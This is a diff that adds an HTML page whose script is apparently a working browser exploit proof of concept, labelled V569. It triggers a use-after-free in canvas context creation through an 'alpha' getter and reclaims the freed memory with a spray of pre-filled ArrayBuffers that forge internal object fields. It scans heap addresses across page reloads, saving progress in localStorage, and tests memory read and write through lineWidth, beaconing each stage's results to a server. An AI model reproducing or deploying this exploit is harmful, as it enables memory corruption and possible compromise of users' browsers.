@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V569</title></head>
+<body><pre id="out">V569…</pre>
+<script>
+'use strict';
+var RID='v569'+Date.now().toString(36).slice(-6);
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{fetch('/beacon/V569-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now(),{method:'GET',cache:'no-store'}).catch(function(){});}catch(e){}}
+
+var P=new URLSearchParams(location.search);
+var MODE=P.get('m')||'cal';
+var N4K=+(P.get('n4k')||'0');
+var N768=+(P.get('n768')||'200');
+var GUESS=parseInt(P.get('addr')||'0',16)||0;
+var BASE=parseInt(P.get('base')||'0',16)||0;
+
+/* ===== SCAN mode: auto-advance via localStorage ===== */
+var SCAN_START=0x200000000;
+var SCAN_END=0x280000000;
+var SCAN_STRIDE=N768*768;
+var scanGuess=0;
+var scanAttempt=0;
+
+if(MODE==='scan'){
+  try{
+    var sg=localStorage.getItem('v569_scan');
+    if(sg){
+      var obj=JSON.parse(sg);
+      scanGuess=obj.next||SCAN_START;
+      scanAttempt=obj.attempt||0;
+    }else{
+      scanGuess=SCAN_START;
+    }
+    if(scanGuess>=SCAN_END){
+      say('SCAN EXHAUSTED — range 0x'+SCAN_START.toString(16)+' to 0x'+SCAN_END.toString(16));
+      bk('SCAN-END','exhausted');
+      MODE='done';
+    }
+  }catch(e){scanGuess=SCAN_START;}
+  BASE=scanGuess;
+}
+
+say('MODE='+MODE+' N768='+N768+(N4K?' N4K='+N4K:''));
+if(MODE==='scan')say('SCAN attempt='+scanAttempt+' guess=0x'+scanGuess.toString(16)+' stride=0x'+SCAN_STRIDE.toString(16));
+if(MODE==='probe')say('GUESS=0x'+GUESS.toString(16));
+if(MODE==='self')say('BASE=0x'+BASE.toString(16));
+bk('BOOT','mode='+MODE+',n768='+N768+',attempt='+scanAttempt+',guess=0x'+(scanGuess||BASE||GUESS).toString(16));
+
+if(MODE==='done'){say('Nothing to do.');throw new Error('done');}
+
+/* ===== P1: Optional AB(4096) marker spray ===== */
+var m4k=[];
+var MARK=2.718281828;
+if(N4K>0){
+  try{
+    for(var i=0;i<N4K;i++){
+      var ab=new ArrayBuffer(4096);
+      var f=new Float64Array(ab);
+      f[6]=MARK+i;
+      f[0]=i;
+      m4k.push(ab);
+    }
+    say('P1: '+N4K+' AB(4096) ok');
+    bk('P1','sprayed='+N4K);
+  }catch(e){say('P1-ERR:'+e.message);bk('P1E',e.message);}
+}
+
+/* ===== P2: triggerUAF ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    innerCtx=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+var outerC;
+try{
+  outerC=triggerUAF();
+  say('P2: UAF '+(innerCtx?'OK':'NULL'));
+  bk('P2','ctx='+(innerCtx?'OK':'NULL'));
+}catch(e){say('P2-ERR:'+e.message);bk('P2E',e.message);}
+
+/* ===== P3: AB(768) reclaim spray with pre-fill ===== */
+var a768=[];
+var v768=[];
+var useBase=(MODE==='self'||MODE==='scan');
+try{
+  for(var i=0;i<N768;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+
+    // +32: m_canvas — non-zero for GC safety
+    dv.setUint32(32,0x41414141,true);
+    dv.setUint32(36,0x00000001,true);
+
+    // +120: m_stateStack.m_capacity = 1
+    dv.setUint32(120,1,true);
+    // +124: m_stateStack.m_size = 1
+    dv.setUint32(124,1,true);
+    // +384: m_unrealizedSaveCount = 0
+    dv.setUint32(384,0,true);
+
+    if(MODE==='probe'){
+      var lo=GUESS>>>0, hi=Math.floor(GUESS/0x100000000)>>>0;
+      dv.setUint32(112,lo,true);
+      dv.setUint32(116,hi,true);
+    }else if(useBase){
+      // Each AB assumes its own address = BASE + i*768
+      var selfAddr=BASE+i*768;
+      var bufAddr=selfAddr+128;
+      dv.setUint32(112,(bufAddr>>>0),true);
+      dv.setUint32(116,(Math.floor(bufAddr/0x100000000)>>>0),true);
+      // Marker at +176 (inline State +48 = lineWidth)
+      dv.setFloat64(176,9000+i,false);
+    }
+
+    if(!useBase){
+      dv.setFloat64(176,77777+i,false);
+    }
+
+    a768.push(ab);
+    v768.push(dv);
+  }
+  say('P3: '+N768+' AB(768) pre-filled');
+  bk('P3','sprayed='+N768);
+}catch(e){say('P3-ERR:'+e.message);bk('P3E',e.message);}
+
+/* ===== P4: JS-only smoke ===== */
+try{
+  var ts=innerCtx.toString();
+  say('P4-STR: '+ts);
+  bk('P4S',ts);
+}catch(e){say('P4-STR-ERR:'+e.message);bk('P4SE',e.message);}
+say('P4-TYPE: '+(typeof innerCtx));
+bk('P4T',typeof innerCtx);
+
+/* ===== P5: lineWidth / scan ===== */
+if(MODE==='cal'){
+  say('P5: calibrate — skipping lineWidth');
+  bk('P5','skip-cal');
+  var dump='';
+  for(var i=0;i<Math.min(N768,10);i++){
+    var u8=new Uint8Array(a768[i]);
+    var s='AB'+i+':';
+    for(var j=0;j<32;j++)s+=('0'+u8[j].toString(16)).slice(-2);
+    dump+=s+'; ';
+  }
+  say('P5-DUMP: '+dump.slice(0,400));
+  bk('P5D',dump.slice(0,450));
+
+}else if(MODE==='scan'){
+  // CRITICAL: store NEXT guess BEFORE the crash-prone lineWidth read
+  var nextGuess=scanGuess+SCAN_STRIDE;
+  try{
+    localStorage.setItem('v569_scan',JSON.stringify({next:nextGuess,attempt:scanAttempt+1,last_tried:'0x'+scanGuess.toString(16)}));
+  }catch(e){}
+
+  say('P5: SCAN attempt #'+scanAttempt+' base=0x'+scanGuess.toString(16));
+  say('P5: next=0x'+nextGuess.toString(16)+' (stored before read)');
+  bk('P5','scan,attempt='+scanAttempt+',base=0x'+scanGuess.toString(16)+',next=0x'+nextGuess.toString(16));
+
+  try{
+    var lw=innerCtx.lineWidth;
+    say('P5-LW: '+lw);
+    bk('P5LW',''+lw);
+
+    var idx=Math.round(lw-9000);
+    if(idx>=0&&idx<N768){
+      var hitAddr=scanGuess+idx*768;
+      say('!!!! P5-SCAN-HIT !!!! AB#'+idx+' → addr=0x'+hitAddr.toString(16));
+      bk('P5HIT','idx='+idx+',addr=0x'+hitAddr.toString(16)+',attempt='+scanAttempt);
+      // Store the HIT permanently
+      try{localStorage.setItem('v569_hit',JSON.stringify({addr:'0x'+hitAddr.toString(16),idx:idx,attempt:scanAttempt,base:'0x'+scanGuess.toString(16)}));}catch(e){}
+
+      // Try write + readback
+      try{
+        innerCtx.lineWidth=31337.5;
+        var lw2=innerCtx.lineWidth;
+        say('P5-WR: set=31337.5 read='+lw2);
+        bk('P5WR','set=31337.5,read='+lw2);
+      }catch(e2){say('P5-WR-ERR:'+e2.message);bk('P5WE',e2.message);}
+      try{
+        var ml=innerCtx.miterLimit;
+        say('P5-ML: '+ml);bk('P5ML',''+ml);
+      }catch(e3){}
+      try{
+        var ga=innerCtx.globalAlpha;
+        say('P5-GA: '+ga);bk('P5GA',''+ga);
+      }catch(e4){}
+    }else{
+      say('P5-NOMATCH: lw='+lw+' (not a marker, but no crash!)');
+      bk('P5NM','lw='+lw);
+    }
+  }catch(e){
+    say('P5-LW-ERR: '+e.message);
+    bk('P5LE',e.message);
+  }
+
+}else if(MODE==='probe'||MODE==='self'){
+  say('P5: attempting lineWidth read...');
+  bk('P5','pre-lw,mode='+MODE);
+  try{
+    var lw=innerCtx.lineWidth;
+    say('P5-LW: '+lw);
+    bk('P5LW',''+lw);
+    if(MODE==='probe'){
+      var idx=Math.round(lw-MARK);
+      if(idx>=0&&idx<N4K){
+        say('P5-HIT! AB(4096) #'+idx+' → addr≈0x'+(GUESS+idx*4096).toString(16));
+        bk('P5HIT','idx='+idx+',addr=0x'+(GUESS+idx*4096).toString(16));
+      }else{
+        say('P5-NOMATCH: lw='+lw);bk('P5NM','lw='+lw);
+      }
+    }else{
+      var idx=Math.round(lw-9000);
+      if(idx>=0&&idx<N768){
+        var hitAddr=BASE+idx*768;
+        say('P5-SELF-HIT! AB#'+idx+' → addr=0x'+hitAddr.toString(16));
+        bk('P5SH','idx='+idx+',addr=0x'+hitAddr.toString(16));
+      }else{say('P5-SELF-NM: lw='+lw);bk('P5SNM','lw='+lw);}
+    }
+    try{innerCtx.lineWidth=31337.5;var lw2=innerCtx.lineWidth;say('P5-WR: set=31337.5 read='+lw2);bk('P5WR','set=31337.5,read='+lw2);}catch(e2){}
+    try{say('P5-ML: '+innerCtx.miterLimit);bk('P5ML',''+innerCtx.miterLimit);}catch(e3){}
+    try{say('P5-GA: '+innerCtx.globalAlpha);bk('P5GA',''+innerCtx.globalAlpha);}catch(e4){}
+  }catch(e){say('P5-LW-ERR: '+e.message);bk('P5LE',e.message);}
+}
+
+/* ===== P6: done ===== */
+say('P6: V569 complete');
+bk('DONE','V569-'+MODE+'-complete');
+
+// Show scan state for user
+if(MODE==='scan'||MODE==='cal'){
+  try{
+    var state=localStorage.getItem('v569_scan');
+    var hit=localStorage.getItem('v569_hit');
+    say('---');
+    say('Scan state: '+(state||'none'));
+    say('Hit: '+(hit||'none'));
+  }catch(e){}
+}
+</script>
+</body>
+</html>
